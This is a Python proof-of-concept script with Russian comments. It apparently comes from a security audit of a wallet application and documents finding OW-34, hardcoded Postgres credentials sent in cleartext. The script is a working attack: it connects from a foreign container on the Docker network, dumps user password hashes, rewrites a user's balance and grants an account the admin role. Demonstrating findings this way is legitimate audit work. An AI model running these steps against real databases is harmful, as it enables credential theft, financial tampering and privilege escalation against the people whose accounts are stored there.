#!/usr/bin/env python3
"""
02 — подключение к Postgres по паролю из репозитория (OW-34).

DSN захардкожен в docker-compose.yml и в дефолте main.go:
    postgres://wallet:wallet@db:5432/wallet?sslmode=disable
Порт 5432 на хост не публикуется, но БД доступна любому контейнеру
в той же docker-сети (или любому, кто оказался на пути трафика:
sslmode=disable значит поток открытым текстом).

Запуск из корня репозитория:
    python3 poc/02_default_db_creds.py
"""
import subprocess
import sys

NET = "office-wallet-main_default"
IMAGE = "postgres:16-alpine"
PSQL = ["docker", "run", "--rm", "--network", NET, "-e", "PGPASSWORD=wallet",
        IMAGE, "psql", "-h", "db", "-U", "wallet", "-d", "wallet", "-tA"]


def psql(sql):
    """Запрос из «чужого» контейнера в compose-сети — приложение не участвует."""
    print("    \033[36m→ SQL\033[0m %s" % sql)
    p = subprocess.run(PSQL + ["-c", sql], capture_output=True, text=True)
    if p.returncode != 0:
        print("    \033[31m← psql: %s\033[0m" % (p.stderr.strip() or "пустой ответ"))
        return 1
    body = "\n    ".join(p.stdout.rstrip().splitlines()) or "(пусто)"
    print("    \033[36m← psql\033[0m %s" % body)
    return 0


def step(title):
    print("\n\033[1m== %s ==\033[0m" % title)


def main():
    step("OW-34: подключение по wallet/wallet из чужого контейнера в сети")
    if psql("SELECT current_user, current_database(), version();"):
        return 1

    step("OW-34: дамп паролей")
    if psql("SELECT id, login, role, password_hash FROM users ORDER BY id;"):
        return 1

    step("OW-34: запись: баланс первого юзера")
    if psql("UPDATE users SET balance_kop=77700000 WHERE id=1 "
            "RETURNING id, login, balance_kop;"):
        return 1

    step("OW-34: запись: назначение себе роли admin")
    if psql("UPDATE users SET role='admin' WHERE login='ivanov' "
            "RETURNING login, role;"):
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
